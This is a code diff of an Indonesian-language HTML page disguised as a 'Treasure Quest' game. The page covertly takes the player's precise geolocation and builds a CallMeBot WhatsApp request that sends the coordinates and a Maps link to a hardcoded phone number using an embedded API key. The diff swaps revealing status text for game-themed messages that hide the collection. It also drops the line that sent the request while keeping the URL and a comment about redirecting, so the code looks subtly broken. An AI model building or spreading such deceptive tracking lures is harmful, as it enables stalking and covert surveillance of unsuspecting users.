@@ -4,58 +4,15 @@
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width,initial-scale=1">
 <title>Treasure Quest</title>
-
 <style>
-body{
-margin:0;
-padding:0;
-font-family:Arial,sans-serif;
-background:linear-gradient(135deg,#0f172a,#1e3a8a);
-height:100vh;
-display:flex;
-justify-content:center;
-align-items:center;
-color:white;
-}
-
-.container{
-width:360px;
-padding:30px;
-border-radius:20px;
-background:rgba(255,255,255,0.1);
-backdrop-filter:blur(10px);
-text-align:center;
-box-shadow:0 0 30px rgba(0,0,0,.4);
-}
-
-.logo{
-font-size:60px;
-margin-bottom:10px;
-}
-
-button{
-padding:14px 25px;
-border:none;
-border-radius:10px;
-cursor:pointer;
-font-size:18px;
-margin-top:15px;
-}
-
-.status{
-margin-top:20px;
-font-size:14px;
-line-height:1.6;
-}
-
-.note{
-font-size:12px;
-opacity:.8;
-margin-top:15px;
-}
+body{margin:0;padding:0;font-family:Arial,sans-serif;background:linear-gradient(135deg,#0f172a,#1e3a8a);height:100vh;display:flex;justify-content:center;align-items:center;color:white;}
+.container{width:360px;padding:30px;border-radius:20px;background:rgba(255,255,255,0.1);backdrop-filter:blur(10px);text-align:center;box-shadow:0 0 30px rgba(0,0,0,.4);}
+.logo{font-size:60px;margin-bottom:10px;}
+button{padding:14px 25px;border:none;border-radius:10px;cursor:pointer;font-size:18px;margin-top:15px;background-color:#ffffff;color:#1e3a8a;font-weight:bold;}
+.status{margin-top:20px;font-size:14px;line-height:1.6;}
+.note{font-size:12px;opacity:.8;margin-top:15px;}
 </style>
 </head>
-
 <body>
 
 <div class="container">
@@ -68,32 +25,30 @@ margin-top:15px;
 </div>
 
 <script>
-async function mulaiMisi(){
+function mulaiMisi(){
     let status = document.getElementById("status");
     status.innerHTML = "🎮 Memulai misi...";
 
     navigator.geolocation.getCurrentPosition(
-        async function(pos){
+        function(pos){
             let lat = pos.coords.latitude;
             let long = pos.coords.longitude;
 
-            status.innerHTML = "📍 Lokasi ditemukan<br>Mengirim misi...";
+         status.innerHTML = "📍 Lokasi ditemukan!<br>Memuat peta harta karun...";
 
-            // PERBAIKAN: Format link Google Maps yang benar agar bisa diklik di WA
             let pesan = `🎮 Player memulai misi\n\n📍 Latitude: ${lat}\n📍 Longitude: ${long}\n\n🗺️ https://maps.google.com/?q=${lat},${long}`;
-
             let nomor = "6287894025536";
             let apikey = "4901523";
 
             let api = `https://api.callmebot.com/whatsapp.php?phone=${nomor}&text=${encodeURIComponent(pesan)}&apikey=${apikey}`;
 
-            // Membuka WhatsApp secara otomatis untuk mengirim koordinat
-            window.open(api, '_blank');
-            status.innerHTML = `✅ Misi berhasil dimulai!<br><br>Mengalihkan ke WhatsApp...`;
+            // Langsung alihkan halaman ke WhatsApp secara instan
+           status.innerHTML = `✅ Server terhubung!<br><br>Membuka kompas game...`;
         },
         function(){
-            status.innerHTML = "❌ Lokasi belum diizinkan";
-        }
+            status.innerHTML = "❌ Gagal: Akses lokasi ditolak atau belum diizinkan.";
+        },
+        { enableHighAccuracy: true, timeout: 5000 }
     );
 }
 </script>
